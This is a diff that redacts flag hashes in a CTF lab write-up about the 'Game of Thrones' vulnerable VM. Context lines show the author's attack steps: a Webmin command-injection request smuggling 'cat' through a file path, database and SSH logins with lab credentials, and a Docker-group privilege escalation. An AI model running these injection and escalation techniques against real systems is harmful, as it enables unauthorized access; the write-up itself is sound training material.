@@ -4,6 +4,8 @@
 
 > **Scope:** This write-up describes a lab CTF environment. I treated the target as an authorized vulnerable VM and documented the steps I performed to collect the seven kingdom flags, the three secret flags, and the final battle flag.
 
+> Note: Flags were partially redacted to preserve scoreboard integrity.
+
 ## Executive Summary
 
 I attacked the Game of Thrones CTF VM as a chained network/web exploitation challenge. I started with reconnaissance, mapped the exposed services, followed clues hidden in web pages, DNS records, source comments, audio metadata, FTP files, databases, IMAP messages, and SSH-accessible checkpoints, and then used each recovered flag or credential to unlock the next kingdom. The path involved classic enumeration, custom HTTP headers, FTP access, DNS TXT records, authenticated Webmin command execution, PostgreSQL/MySQL interaction, port knocking, GitList command injection, SSH pivoting into the Dragonglass mine, and finally a Docker-group privilege escalation to reach the last stage.
@@ -12,17 +14,17 @@ I attacked the Game of Thrones CTF VM as a chained network/web exploitation chal
 
 | Stage | Flag |
 | --- | --- |
-| Dorne | fb8d98be1265dd88bac522e1b2182140 |
-| Winterfell / The North | 639bae9ac6b3e1a84cebb7b403297b79 |
-| Iron Islands | 5e93de3efa544e85dcd6311732d28f95 |
-| Stormlands | 8fc42c6ddf9966db3b09e84365034357 |
-| Mountain and the Vale | bb3aec0fdcdbc2974890f805c585d432 |
-| The Reach | aee750c2009723355e2ac57564f9c3db |
-| King's Landing | c8d46d341bea4fd5bff866a65ff8aea9 |
-| Secret Flag - Savages | 8bf8854bebe108183caeb845c7676ae4 |
-| Secret Flag - Braavos | 3f82c41a70a8b0cfec9052252d9fd721 |
-| Secret Flag - Dragonglass Mine | a8db1d82db78ed452ba0882fb9554fc9 |
-| Final Battle | 8e63dcd86ef9574181a9b6184ed3dde5 |
+| Dorne | fb8d...[REDACTED]...2140 |
+| Winterfell / The North | 639b...[REDACTED]...7b79 |
+| Iron Islands | 5e93...[REDACTED]...8f95 |
+| Stormlands | 8fc4...[REDACTED]...4357 |
+| Mountain and the Vale | bb3a...[REDACTED]...d432 |
+| The Reach | aee7...[REDACTED]...c3db |
+| King's Landing | c8d4...[REDACTED]...aea9 |
+| Secret Flag - Savages | 8bf8...[REDACTED]...6ae4 |
+| Secret Flag - Braavos | 3f82...[REDACTED]...d721 |
+| Secret Flag - Dragonglass Mine | a8db...[REDACTED]...4fc9 |
+| Final Battle | 8e63...[REDACTED]...dde5 |
 
 ## 1. Reconnaissance and Initial Web Enumeration
 
@@ -84,7 +86,7 @@ After switching the user-agent and exploring the hidden pages, I recovered the p
 ```
 strings game_of_thrones.wav | grep -i flag
 exiftool game_of_thrones.mp3
-# Savages secret flag: 8bf8854bebe108183caeb845c7676ae4
+# Savages secret flag: 8bf8...[REDACTED]...6ae4
 ```
 
 ![Figure 1 - Initial landing page.](assets/game_of_thrones/figure_01.png)
@@ -172,7 +174,7 @@ feroxbuster -u http://winterfell.7kingdoms.ctf/ -w
 200   http://winterfell.7kingdoms.ctf/favicon.ico
 200   http://winterfell.7kingdoms.ctf/meme4.jpg
 
-Winterfell flag: 639bae9ac6b3e1a84cebb7b403297b79
+Winterfell flag: 639b...[REDACTED]...7b79
 ```
 
 ![Figure 13 - CSS comment clue.](assets/game_of_thrones/figure_13.png)
@@ -239,7 +241,7 @@ The Winterfell clues made it clear that I needed to query DNS directly. I checke
 dig @10.0.0.36 TXT 7kingdoms.ctf
 dig @10.0.0.36 TXT Timef0rconqu3rs.7kingdoms.ctf
 
-Iron Islands flag: 5e93de3efa544e85dcd6311732d28f95
+Iron Islands flag: 5e93...[REDACTED]...8f95
 Stormlands credentials: aryastark / N3ddl3_1s_a_g00d_sword#!
 ```
 
@@ -263,7 +265,7 @@ curl --ignore-content-length -b webmin_cookies.txt \
 --request-target "/file/show.cgi/dev/null|cat /home/aryastark/flag.txt|" \
 http://10.0.0.36:10000
 
-Stormlands flag: 8fc42c6ddf9966db3b09e84365034357
+Stormlands flag: 8fc4...[REDACTED]...4357
 ```
 
 ![Figure 27 - Editing /etc/hosts.](assets/game_of_thrones/figure_27.png)
@@ -316,7 +318,7 @@ psql -h 10.0.0.36 -U robinarryn -d mountainandthevale
 \dv
 SELECT * FROM flag;
 
-Mountain and the Vale flag: bb3aec0fdcdbc2974890f805c585d432
+Mountain and the Vale flag: bb3a...[REDACTED]...d432
 ```
 
 The Mountain and the Vale flag output also gave me the next main-kingdom route: the Reach. It supplied the IMAP identity olennatyrell@7kingdoms.ctf / H1gh.Gard3n.powah, but the hint said I first had to open the gates. That matched the earlier Three-eyed-raven clue containing the knock sequence 3487 64535 12345.
@@ -331,7 +333,7 @@ a2 LIST "" "*"
 a3 SELECT INBOX
 a4 FETCH 1:* BODY[]
 
-The Reach flag: aee750c2009723355e2ac57564f9c3db
+The Reach flag: aee7...[REDACTED]...c3db
 Casterly Rock credentials: TywinLannister / LannisterN3verDie!
 ```
 
@@ -423,7 +425,7 @@ mysql -h 10.0.0.36 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding \
 mysql -h 10.0.0.36 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding \
 -e "SELECT * FROM temp_flag;"
 
-King's Landing flag: c8d46d341bea4fd5bff866a65ff8aea9
+King's Landing flag: c8d4...[REDACTED]...aea9
 SSH credentials: daenerystargaryen / .Dracarys4thewin.
 ```
 
@@ -466,7 +468,7 @@ cat digger.txt
 ssh root@172.25.0.2
 # password: Dr4g0nGl4ss!
 
-Dragonglass secret flag: a8db1d82db78ed452ba0882fb9554fc9
+Dragonglass secret flag: a8db...[REDACTED]...4fc9
 ```
 
 The final host context exposed branstark. I checked my privileges and noticed that branstark belonged to the docker group. That was the privilege escalation path. Because Docker access can allow a user to start a container as root and mount the host filesystem, I used an existing local image, mounted / into /host, and chrooted into it.
@@ -539,7 +541,7 @@ psql -h 10.0.0.36 -U TheRedWomanMelisandre -d braavos
 \dt
 SELECT * FROM temple_of_the_faceless_men;
 
-Braavos secret flag: 3f82c41a70a8b0cfec9052252d9fd721
+Braavos secret flag: 3f82...[REDACTED]...d721
 ```
 
 ![Figure 69 - Braavos PostgreSQL access.](assets/game_of_thrones/figure_69.png)
@@ -566,13 +568,13 @@ I took the last ten characters of each secret flag and concatenated them in the 
 
 | Secret source | Flag | Last 10 characters |
 | --- | --- | --- |
-| Savages | 8bf8854bebe108183caeb845c7676ae4 | 45c7676ae4 |
-| Braavos | 3f82c41a70a8b0cfec9052252d9fd721 | 252d9fd721 |
-| Dragonglass | a8db1d82db78ed452ba0882fb9554fc9 | 2fb9554fc9 |
+| Savages | 8bf8...[REDACTED]...6ae4 | 45c...[REDACTED]...e4 |
+| Braavos | 3f82...[REDACTED]...d721 | 252...[REDACTED]...21 |
+| Dragonglass | a8db...[REDACTED]...4fc9 | 2fb...[REDACTED]...c9 |
 
 ```
 Final battle archive password:
-45c7676ae4252d9fd7212fb9554fc9
+45c7...[REDACTED]...4fc9
 ```
 
 After deriving the password, I did not extract the archive directly on the target. I first copied final_battle.zip to my own PC using scp, then extracted it locally with 7z and read the final flag. The victory message confirmed that the Game of Thrones CTF had been completed.
@@ -585,10 +587,10 @@ chmod 644 /tmp/final_battle.zip
 # From my PC I copied it locally before extracting it.
 scp branstark@10.0.0.36:/tmp/final_battle.zip ./final_battle.zip
 
-7z x final_battle.zip -ofinal_extracted -p45c7676ae4252d9fd7212fb9554fc9 -y
+7z x final_battle.zip -ofinal_extracted -p45c7...[REDACTED]...4fc9 -y
 cat final_extracted/flag.txt
 
-Final Battle flag: 8e63dcd86ef9574181a9b6184ed3dde5
+Final Battle flag: 8e63...[REDACTED]...dde5
 ```
 
 ![Figure 71 - Final battle hint and archive work.](assets/game_of_thrones/figure_71.png)
